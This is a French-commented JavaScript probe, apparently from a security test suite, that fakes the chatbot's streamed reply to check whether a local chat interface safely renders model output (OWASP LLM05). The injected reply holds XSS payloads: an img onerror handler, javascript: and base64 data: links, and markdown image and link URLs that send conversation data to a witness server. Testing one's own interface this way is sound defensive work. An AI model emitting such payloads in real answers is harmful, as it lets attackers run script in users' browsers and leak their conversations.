// Étape 1 (OWASP LLM05) — sonde NAVIGATEUR.
//
// À coller dans la console de l'onglet du chatbot (http://localhost:5173),
// avec le serveur témoin lancé (node security/probes/lib/witness.mjs).
//
// Elle remplace fetch("/api/chat") par un FAUX flux SSE qui renvoie une
// réponse piégée, puis envoie un message. C'est donc le vrai rendu de
// l'interface qui s'exécute, sans dépendre du modèle (qui refuse les URL
// localhost) et sans modifier le code. Recharger la page annule la sonde.
//
// Lecture du résultat :
//  - console : « SONDE-XSS », « SONDE-JS » ou « SONDE-DATA » = du code a été exécuté ;
//  - onglet Réseau (filtre 127.0.0.1:9999) ou witness.log : une requête = fuite.
(() => {
  const W = "http://127.0.0.1:9999";
  const reponse = [
    "Voici la réponse demandée.",
    `HTML : <img src=x onerror="console.log('SONDE-XSS')">`,
    `Image : ![pixel](${W}/sonde-image.png?d=conversation-de-bruno)`,
    "SVG : ![svg](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)",
    "Lien : [clique ici](javascript:console.log('SONDE-JS'))",
    "Lien : [ouvrir](data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnU09OREUtREFUQScpPC9zY3JpcHQ+)",
    `Lien : [la documentation](${W}/sonde-lien?d=conversation-de-bruno)`,
  ].join("\n\n");

  const sse = (event, data) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  const realFetch = window.fetch.bind(window);
  window.fetch = (input, init) => {
    const url = typeof input === "string" ? input : input.url;
    if (!url.endsWith("/api/chat")) return realFetch(input, init);
    const body = sse("delta", { text: reponse }) + sse("done", {});
    console.log("[sonde-01] faux flux SSE servi pour /api/chat");
    return Promise.resolve(new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } }));
  };

  // Envoie un message par l'interface, comme un utilisateur : on choisit
  // bruno (s'il ne l'est pas déjà), on tape le texte, on clique sur Envoyer.
  // Les pauses laissent React appliquer chaque changement d'état.
  const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const setValue = (element, proto, value) => {
    Object.getOwnPropertyDescriptor(proto, "value").set.call(element, value);
    element.dispatchEvent(new Event(element instanceof HTMLSelectElement ? "change" : "input", { bubbles: true }));
  };
  return (async () => {
    const select = document.querySelector("select");
    if (select && select.value !== "bruno") setValue(select, HTMLSelectElement.prototype, "bruno");
    await pause(800);
    setValue(document.querySelector("textarea"), HTMLTextAreaElement.prototype, "Sonde étape 1");
    await pause(200);
    document.querySelector("button[type=submit]").click();
    console.log("[sonde-01] message envoyé ; regarde la console et l'onglet Réseau");
  })();
})();
